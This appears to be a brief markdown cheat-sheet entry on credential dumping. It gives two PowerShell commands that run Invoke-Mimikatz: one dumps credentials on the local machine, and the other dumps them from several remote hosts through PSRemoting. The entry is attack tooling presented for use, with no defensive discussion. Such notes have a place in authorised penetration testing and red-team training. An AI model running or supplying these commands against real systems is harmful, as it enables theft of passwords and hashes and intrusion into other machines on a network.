# Credential Dumping

## Invoke-Mimikatz

```powershell
# Dump on local machine
Invoke-Mimikatz -DumpCreds

# Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
```
